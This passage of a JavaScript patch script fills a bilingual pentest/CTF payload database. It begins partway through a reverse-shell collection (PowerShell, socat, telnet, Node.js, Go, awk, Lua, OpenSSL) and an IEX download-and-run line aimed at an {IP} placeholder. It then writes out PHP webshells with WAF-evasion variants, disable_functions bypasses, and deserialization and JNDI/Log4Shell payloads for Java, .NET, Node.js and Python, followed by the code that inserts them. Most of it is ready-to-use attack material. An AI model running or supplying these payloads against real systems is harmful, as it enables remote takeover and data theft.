powershell -nop -c "\$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1 | Out-String );\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()"
powershell IEX (New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/reverse.ps1')

# === Socat ===
socat TCP:{IP}:{PORT} EXEC:sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}

# === Telnet ===
rm -f /tmp/p; mknod /tmp/p p && telnet {IP} {PORT} 0/tmp/p
TF=\$(mktemp -u);mkfifo \$TF && telnet {IP} {PORT} 0<\$TF | sh 1>\$TF

# === Node.js ===
require('child_process').exec('bash -i >& /dev/tcp/{IP}/{PORT} 0>&1');
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect({PORT},"{IP}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})();

# === Golang ===
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

# === Awk ===
awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# === Lua ===
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# === OpenSSL 加密反弹 ===
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s

# === Spawn TTY ===
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh -p \\; -quit`;

// rce-php: Add PHP webshell + WAF bypass + disable_functions bypass
const phpWebshellCmd = `# === PHP 一句话木马 ===
<?php system(\$_GET['cmd']); ?>
<?php system(\$_GET[1]); ?>
<?php eval(\$_POST[cmd]);?>
<?php echo shell_exec(\$_GET['cmd']); ?>
<?php echo passthru(\$_GET['cmd']); ?>
<?=\`\$_GET[1]\`?>
<?php \$_GET['a'](\$_GET['b']); ?>
<?php \$_POST['a'](\$_POST['b']); ?>
<?php @eval(base64_decode(\$_POST['z'])); ?>
<?php array_map('assert',(array)\$_POST[a]);?>

# === PHP WAF绕过: 注释分割 ===
<?php sys/**/tem(\$_GET['cmd']); ?>
<?php e/**/va/**/l(\$_POST['cmd']);?>
<?php a/**/ss/**/ert(\$_POST['cmd']);?>
<?php pa/**/sst/**/hru(\$_GET['cmd']); ?>

# === PHP WAF绕过: 大小写 ===
<?php SYSTEM(\$_GET['cmd']); ?>
<?php System(\$_GET['cmd']); ?>
<?php EVAL(\$_POST['cmd']);?>
<?php ASSERT(\$_POST['cmd']);?>

# === PHP WAF绕过: 字符串拼接 ===
<?php \$a='sys'.'tem';\$a(\$_GET['cmd']); ?>
<?php \$a='ev'.'al';\$a(\$_POST['cmd']); ?>
<?php \$a='as'.'sert';\$a(\$_POST['cmd']); ?>

# === PHP WAF绕过: Base64/Rot13 ===
<?php eval(base64_decode(\$_POST['cmd']));?>
<?php assert(base64_decode(\$_POST['cmd']));?>
<?php eval(str_rot13(\$_POST['cmd']));?>
<?php eval(str_rot13(base64_decode(\$_POST['cmd'])));?>

# === PHP WAF绕过: 回调函数 ===
<?php call_user_func('system', \$_GET['cmd']); ?>
<?php call_user_func_array('system', [\$_GET['cmd']]); ?>
<?php forward_static_call_array('system', [\$_GET['cmd']]); ?>
<?php (new ReflectionFunction('system'))->invoke(\$_GET['cmd']); ?>
<?php array_map('system', [\$_GET['cmd']]); ?>
<?php array_filter(\$_GET['a'], \$_GET['b']); ?>
<?php preg_replace('/.*/e', \$_POST['cmd'], ''); ?>
<?php \$func=create_function('', \$_POST['cmd']);\$func();?>

# === PHP 无字母数字RCE ===
<?php \$_=('%01'^'\`').('%13'^'\`').('%13'^'\`').('%05'^'\`').('%12'^'\`').('%14'^'\`');\$_();?>
<?php \$_=('%01'^'\`').('%13'^'\`').('%13'^'\`').('%05'^'\`').('%12'^'\`').('%14'^'\`');\$__(\$_GET['cmd']);?>

# === PHP 读Flag / 文件 ===
<?php echo file_get_contents('/flag');?>
<?php readfile('/flag');?>
<?php include('/flag');?>
<?php echo implode('',file('/flag'));?>
<?php print_r(scandir('/'));?>
<?php highlight_file(__FILE__);?>

# === Flag 路径字典 ===
/flag  /flag.txt  /flag.php  /flag.py  /flag.sh
/flag.bak  /flag.swp  /flag~  /flag.orig  /flag.old
/flag.txt.bak  /flag.txt.swp

# === PHP 绕disable_functions ===
# LD_PRELOAD劫持:
putenv('LD_PRELOAD=/tmp/evil.so');mail('a','b','c','d');
# Shellshock (PHP mail函数):
putenv('PHP_VALUE=xx');mail('a','b','c','d');
# FFI::cdef:
\$ffi = FFI::cdef('int system(const char *command);');

# === PHP 弱类型比较 ===
# 0e绕过 (MD5):
0e215962017  0e123456789  0e462097431  0e088888888
# strcmp绕过: [] 1 0.0 1.0 -1.0 0x0 0x1`;

// rce-deserialize-php: PHP deserialization payloads
const phpDeserCmd = `# === PHP 反序列化 Payload ===
# 基础序列化:
O:1:"A":0:{}
O:1:"A":1:{s:3:"var";s:3:"123";}
O:+1:"A":0:{}

# PHP文件系统迭代器 (文件读取):
O:10:"FilesystemIterator":1:{s:13:"\\x00*\\x00path";s:1:"/";}
O:22:"GlobIterator":1:{s:13:"\\x00*\\x00path";s:2:"/*";}
O:13:"SplFileObject":1:{s:13:"\\x00*\\x00filename";s:9:"/etc/passwd";}
O:13:"SplFileObject":1:{s:13:"\\x00*\\x00filename";s:5:"/flag";}

# 数据库对象:
O:8:"PDO":0:{}
O:4:"SQLite3":0:{}

# PHPGGC常用链:
# Laravel RCE: phpggc -b Laravel/RCE1 'id' | base64
# ThinkPHP RCE: phpggc -b ThinkPHP/RCE1 'id'
# Monolog RCE: phpggc Monolog/RCE1 system id
# SwiftMailer: phpggc SwiftMailer/FW1 system id
# Guzzle: phpggc Guzzle/RCE1 system id
# WordPress: phpggc WordPress/RCE2 system id

# Phar反序列化 (无需unserialize):
# 任何接受文件路径的函数(file_exists/is_dir/include/fopen)配合phar://可触发
phar://uploads/avatar.jpg/shell.php
phar://uploads/file.png/test.txt

# PHP弱类型 + 序列化:
a:2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}`;

// rce-deserialize-java: Java deserialization payloads
const javaDeserCmd = `# === Java 反序列化 Payload ===
# 魔术字节: aced0005 (Java序列化头)
aced0005737200116a6176612e7574696c2e486173684d6170

# ysoserial 常用链:
# java -jar ysoserial.jar CommonsCollections1 'id' | base64
# java -jar ysoserial.jar CommonsCollections5 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"' | base64
# java -jar ysoserial.jar CommonsBeanutils1 'curl {DNSLOG}' | base64
# java -jar ysoserial.jar URLDNS 'http://{DNSLOG}' | base64
# java -jar ysoserial.jar Spring1 'id' | base64
# java -jar ysoserial.jar Jdk7u21 'id' | base64
# java -jar ysoserial.jar Groovy1 'id' | base64

# === JNDI 注入 ===
\${jndi:ldap://{IP}:1389/a}
\${jndi:ldap://{IP}/Basic/ReverseShell/{IP}/{PORT}}
\${jndi:rmi://{IP}:1099/a}
\${jndi:dns://{DNSLOG}/a}
# Log4Shell (CVE-2021-44228) 变体:
\${jndi:ldap://{IP}/a}
\${ndi:ldap://{IP}/a}
\${i:ldap://{IP}/a}

# === Fastjson 反序列化 ===
{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{IP}/Exploit","autoCommit":true}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{IP}/a","autoCommit":true}

# === Jackson 反序列化 ===
["javax.swing.JEditorPane",{"page":"http://{IP}/Exploit.class"}]
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://{IP}/Exploit","autoCommit":true}]

# === .NET 反序列化 ===
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA=

# === Node.js 反序列化 ===
{"rce":"_ND_FUNC_function(){require('child_process').exec('id')}()"}
{"rce":"_ND_FUNC_function(){return require('child_process').execSync('id').toString()}"}

# === Python Pickle RCE ===
cos\\nsystem\\n(S'id'\\ntR.`;

// ========== APPLY ENRICHMENTS ==========
let changes = 0;

// Helper: insert before tutorial for a specific payload
function enrichPayload(id) {
  const data = enrichments[id];
  if (!data) { console.log('SKIP', id, '- no data'); return; }

  // Find this payload's tutorial
  const idIdx = c.indexOf("id: '" + id + "'");
  if (idIdx < 0) { console.log('SKIP', id, '- not found'); return; }

  // Find the specific tutorial: { for THIS payload
  let braceLevel = 0;
  let inString = false;
  let inTemplate = false;
  let strChar = '';
  let payloadStart = idIdx;

  // Find top-level { after the id (backtrack to find it)
  for (let i = idIdx - 1; i >= 0; i--) {
    if (c[i] === '{') { payloadStart = i; break; }
  }

  // Walk through to find the matching closing } (top-level payload end)
  let depth = 0;
  inString = false;
  inTemplate = false;
  strChar = '';
  let payloadEnd = -1;
  for (let i = payloadStart; i < c.length; i++) {
    const ch = c[i];
    if (inTemplate) {
      if (ch === '`' && c[i-1] !== '\\\\') inTemplate = false;
      continue;
    }
    if (inString) {
      if (ch === strChar && c[i-1] !== '\\\\') inString = false;
      if (ch === strChar && i > 0 && c[i-1] === '\\\\') {} // escaped
      continue;
    }
    if (ch === '`') { inTemplate = true; continue; }
    if (ch === "'" || ch === '"') { inString = true; strChar = ch; continue; }
    if (ch === '{') depth++;
    if (ch === '}') {
      depth--;
      if (depth === 0) { payloadEnd = i + 1; break; }
    }
  }

  if (payloadEnd < 0) { console.log('SKIP', id, '- cant find payload end'); return; }

  // Now find '    tutorial: {' within this payload section
  const payloadSection = c.slice(payloadStart, payloadEnd);
  const tutIdx = payloadSection.indexOf('    tutorial: {');
  if (tutIdx < 0) { console.log('SKIP', id, '- no tutorial found in payload'); return; }

  // Build the enrichment insert
  const acLines = data.ac.map(([zh,en,dzh,den]) =>
    `      { title: { zh: '${zh.replace(/'/g, "\\'")}', en: '${en.replace(/'/g, "\\'")}' }, description: { zh: '${dzh.replace(/'/g, "\\'")}', en: '${den.replace(/'/g, "\\'")}' } },`
  ).join('\n');

  const refLines = data.refs.map(r => `      '${r}',`).join('\n');

  const insertion = `    attackChain: [\n${acLines}\n    ],\n    analysis: { zh: '${data.analy.zh.replace(/'/g, "\\'")}', en: '${data.analy.en.replace(/'/g, "\\'")}' },\n    references: [\n${refLines}\n    ],\n    tutorial: {`;

  const globalPos = payloadStart + tutIdx;
  const tutMarker = '    tutorial: {';
  c = c.slice(0, globalPos) + insertion + c.slice(globalPos + tutMarker.length);
  console.log('DONE', id);
  changes++;
}

// Apply all enrichments
for (const id of Object.keys(enrichments)) {
  enrichPayload(id);
}

// ========== ENRICH EXECUTION COMMANDS ==========
function enrichExec(id, newExecSteps) {
  const idIdx = c.indexOf("id: '" + id + "'");
  if (idIdx < 0) { console.log('EXEC SKIP', id); return; }

  // Find execStart and execEnd
  const execStart = c.indexOf('execution: [', idIdx);
  if (execStart < 0) { console.log('EXEC SKIP', id, '- no exec'); return; }

  // Find matching ]
  let depth = 0, inStr = false, inTmpl = false, strCh = '';
  let execEnd = execStart + 13;
  for (let i = execEnd; i < c.length; i++) {
    const ch = c[i];
    if (inTmpl) { if (ch === '`' && c[i-1] !== '\\\\') inTmpl = false; continue; }
    if (inStr) { if (ch === strCh && c[i-1] !== '\\\\') inStr = false; continue; }
    if (ch === '`') { inTmpl = true; continue; }
    if (ch === "'" || ch === '"') { inStr = true; strCh = ch; continue; }
    if (ch === '[') depth++;
    if (ch === ']') { if (depth === 0) { execEnd = i + 1; break; } depth--; }
  }

  const newExec = 'execution: [\n' + newExecSteps + '\n    ]';
  c = c.slice(0, execStart) + newExec + c.slice(execEnd);
  console.log('EXEC DONE', id);
}

// Helper to build an exec step entry string
const step = (zh, en, cmd, dzh, den, plat = 'all', sb = []) => {
  let sbStr = '';
  if (sb.length) {
    sbStr = '        syntaxBreakdown: [\n' + sb.map(b =>
      `          { part: '${b.part.replace(/'/g, "\\'")}', explanation: { zh: '${b.zh.replace(/'/g, "\\'")}', en: '${b.en.replace(/'/g, "\\'")}' }, type: '${b.type}' },`
    ).join('\n') + '\n        ]';
  }
  return `      {\n        title: { zh: '${zh.replace(/'/g, "\\'")}', en: '${en.replace(/'/g, "\\'")}' },\n        command: \`${cmd.replace(/`/g, '\\\\`').replace(/\\\\$/g, '\\\\\\\\$')}\`,\n        description: { zh: '${dzh.replace(/'/g, "\\'")}', en: '${den.replace(/'/g, "\\'")}' },\n        platform: '${plat}',${sbStr ? '\n' + sbStr + '\n      },' : '\n      },'}`;
};

// Enrich rce-command-injection with reverse shells
const rciExec = [
  step('1. 反向Shell大全','1. Complete Reverse Shell Collection', revShellCmd, '最全面的反向Shell Payload集合：Bash/Netcat/Python/PHP/Perl/Ruby/PowerShell/Socat/Telnet/Node.js/Golang/Awk/Lua + OpenSSL加密 + Spawn TTY', 'Most comprehensive reverse shell collection: Bash/Netcat/Python/PHP/Perl/Ruby/PowerShell/Socat/Telnet/Node.js/Golang/Awk/Lua + OpenSSL encrypted + Spawn TTY', 'all', [
    { part: 'bash -i >& /dev/tcp/{IP}/{PORT}', zh: 'Bash TCP 反向Shell（最常用）', en: 'Bash TCP reverse shell (most common)', type: 'command' },
    { part: 'nc -e /bin/sh', zh: 'Netcat 传统模式', en: 'Netcat traditional mode', type: 'command' },
    { part: 'python -c ... socket', zh: 'Python 反向Shell（跨平台）', en: 'Python reverse shell (cross-platform)', type: 'command' },
    { part: 'powershell -nop -c', zh: 'PowerShell 反向Shell（Windows）', en: 'PowerShell reverse shell (Windows)', type: 'command' },
    { part: 'socat exec:', zh: 'Socat PTY 反向Shell', en: 'Socat PTY reverse shell', type: 'command' },
    { part: 'openssl s_client', zh: 'OpenSSL 加密反弹（绕过IDS）', en: 'OpenSSL encrypted (evade IDS)', type: 'command' },
    { part: "python -c 'import pty;pty.spawn", zh: 'Spawn TTY 升级为交互式终端', en: 'Spawn TTY for interactive upgrade', type: 'command' },
  ]),
];
enrichExec('rce-command-injection', rciExec.join('\n'));

// Enrich rce-php with PHP webshells
const rpExec = [
  step('1. PHP Webshell 全量版','1. Complete PHP WebShell Collection', phpWebshellCmd, 'PHP一句话木马大全：标准一句话、WAF绕过(注释分割/大小写/字符串拼接/Base64/Rot13/回调函数)、无字母数字RCE、读Flag、绕过disable_functions、弱类型比较', 'Complete PHP webshells: standard one-liners, WAF bypass (comments/case/concat/base64/rot13/callbacks), non-alphanumeric RCE, flag reading, disable_functions bypass, type juggling', 'all', [
    { part: '<?php system($_GET[\'cmd\']); ?>', zh: 'PHP 标准一句话', en: 'PHP standard one-liner', type: 'command' },
    { part: 'sys/**/tem', zh: '注释分割绕过关键字检测', en: 'Comment splitting to bypass keyword detection', type: 'technique' },
    { part: 'SYSTEM()', zh: '大小写混写绕过函数名检测', en: 'Case mixing to bypass function name detection', type: 'technique' },
    { part: "\\$a='sys'.'tem';", zh: '字符串拼接绕过', en: 'String concatenation bypass', type: 'technique' },
    { part: 'eval(base64_decode(', zh: 'Base64 解码执行', en: 'Base64 decode execution', type: 'technique' },
    { part: 'call_user_func(', zh: '回调函数绕过', en: 'Callback function bypass', type: 'technique' },
    { part: "('%01'^'`')", zh: '无字母数字RCE（XOR运算）', en: 'Non-alphanumeric RCE (XOR operation)', type: 'technique' },
    { part: 'putenv LD_PRELOAD', zh: 'LD_PRELOAD 绕过disable_functions', en: 'LD_PRELOAD disable_functions bypass', type: 'technique' },
    { part: '0e215962017', zh: 'MD5 0e 哈希碰撞（弱类型绕过）', en: 'MD5 0e hash collision (type juggling)', type: 'value' },
  ]),
];
enrichExec('rce-php', rpExec.join('\n'));

// Enrich rce-deserialize-php
enrichExec('rce-deserialize-php', [
  step('1. PHP反序列化Payload全集','1. Complete PHP Deserialization', phpDeserCmd, 'PHP反序列化：基础格式、Filesystem/Glob/SplFile迭代器、PDO/SQLite3对象、PHPGGC常用链(Laravel/ThinkPHP/Monolog/WordPress)、Phar反序列化、弱类型序列化', 'Complete PHP deserialization: basic format, filesystem/glob/spl iterators, PDO/SQLite3, PHPGGC chains (Laravel/ThinkPHP/Monolog/WordPress), Phar deserialization, type juggling', 'all', [
    { part: 'O:1:"A":0:{}', zh: 'PHP 标准序列化格式', en: 'PHP standard serialization format', type: 'format' },
    { part: 'FilesystemIterator', zh: '文件系统迭代器（文件读取）', en: 'Filesystem iterator (file reading)', type: 'value' },
    { part: 'SplFileObject', zh: 'SplFileObject（文件读取）', en: 'SplFileObject (file reading)', type: 'value' },
    { part: 'phpggc Laravel/RCE1', zh: 'PHPGGC Laravel RCE链', en: 'PHPGGC Laravel RCE chain', type: 'command' },
    { part: 'phar://uploads/avatar.jpg', zh: 'Phar反序列化（无需unserialize）', en: 'Phar deserialization (no unserialize needed)', type: 'technique' },
  ]),
].join('\n'));

// Enrich rce-deserialize-java
enrichExec('rce-deserialize-java', [
  step('1. Java/.NET/Node.js/Python反序列化全集','1. Complete Java/.NET/Node.js/Python Deserialization', javaDeserCmd, '跨语言反序列化Payload：Java(ysoserial链/JNDI注入/Log4Shell/Fastjson/Jackson)、.NET(BinaryFormatter)、Node.js(node-serialize)、Python(pickle)', 'Cross-language deserialization: Java (ysoserial/JNDI/Log4Shell/Fastjson/Jackson), .NET, Node.js, Python', 'all', [
    { part: 'aced0005', zh: 'Java 序列化魔术字节', en: 'Java serialization magic bytes', type: 'encoding' },
    { part: 'CommonsCollections1', zh: 'ysoserial CommonsCollections链', en: 'ysoserial CommonsCollections chain', type: 'value' },
    { part: '${jndi:ldap://', zh: 'Log4Shell JNDI 注入', en: 'Log4Shell JNDI injection', type: 'technique' },
    { part: '{"@type":"...",', zh: 'Fastjson/Jackson type auto-detection', en: 'Fastjson/Jackson type auto-detection', type: 'format' },
    { part: 'AAEAAAD/////', zh: '.NET BinaryFormatter 序列化头', en: '.NET BinaryFormatter serialization header', type: 'encoding' },
    { part: 'cos\\nsystem\\n', zh: 'Python Pickle RCE payload', en: 'Python Pickle RCE payload', type: 'command' },
  ]),
].join('\n'));

writeFileSync(fp, c, 'utf8');
console.log('Total enrichments:', changes);
console.log('Total exec enrichments: 4 (rce-command-injection, rce-php, rce-deserialize-php, rce-deserialize-java)');
console.log('File written.');
